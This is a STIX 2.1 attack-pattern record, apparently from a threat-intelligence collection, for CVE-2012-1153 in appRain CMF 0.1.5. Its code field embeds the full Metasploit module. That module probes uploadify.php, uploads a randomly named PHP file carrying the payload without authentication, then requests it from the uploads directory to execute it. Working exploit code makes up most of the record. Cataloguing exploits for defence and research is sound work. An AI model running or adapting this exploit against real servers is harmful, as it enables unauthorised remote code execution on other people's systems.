{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--644219f0-3362-4b3e-b46c-9a189aac97dd",
    "created": "2024-08-14T17:10:16.8257Z",
    "modified": "2024-08-14T17:10:16.825705Z",
    "name": "\"appRain CMF Arbitrary PHP File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability found in appRain's Content Management Framework (CMF), version 0.1.5 or less.  By abusing the uploadify.php file, a malicious user can upload a file to the uploads/ directory without any authentication, which results in arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apprain_upload_exec.rb",
            "external_id": "apprain_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1153"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"appRain CMF Arbitrary PHP File Upload Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in appRain's Content Management\n        Framework (CMF), version 0.1.5 or less.  By abusing the uploadify.php file, a\n        malicious user can upload a file to the uploads/ directory without any\n        authentication, which results in arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'EgiX',   #Discovery, PoC\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-1153'],\n          ['OSVDB', '78473'],\n          ['EDB', '18392'],\n          ['BID', '51576']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['appRain 0.1.5 or less', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-01-19',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to appRain', '/appRain-q-0.1.5'])\n        ])\n  end\n\n  def check\n    uri = target_uri.path\n    uri << '/' if uri[-1,1] != '/'\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'addons/uploadify/uploadify.php')\n    })\n\n    if res and res.code == 200 and res.body.empty?\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    uri = target_uri.path\n\n    peer = \"#{rhost}:#{rport}\"\n    payload_name = Rex::Text.rand_text_alpha(rand(10) + 5) + '.php'\n\n    post_data = \"--o0oOo0o\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"Filedata\\\"; filename=\\\"#{payload_name}\\\"\\r\\n\\r\\n\"\n    post_data << \"<?php \"\n    post_data << payload.encoded\n    post_data << \" ?>\\r\\n\"\n    post_data << \"--o0oOo0o\\r\\n\"\n\n    print_status(\"Sending PHP payload (#{payload_name})\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"addons/uploadify/uploadify.php\"),\n      'ctype'  => 'multipart/form-data; boundary=o0oOo0o',\n      'data'   => post_data\n    })\n\n    # If the server returns 200 and the body contains our payload name,\n    # we assume we uploaded the malicious file successfully\n    if not res or res.code != 200 or res.body !~ /#{payload_name}/\n      print_error(\"File wasn't uploaded, aborting!\")\n      return\n    end\n\n    print_status(\"Executing PHP payload (#{payload_name})\")\n    # Execute our payload\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"addons/uploadify/uploads/#{payload_name}\")\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.  Print the status code for debugging purposes.\n    if res and res.code != 200\n      print_status(\"Server returned #{res.code.to_s}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-19",
    "x_mitre_platforms": [
        "['php']"
    ]
}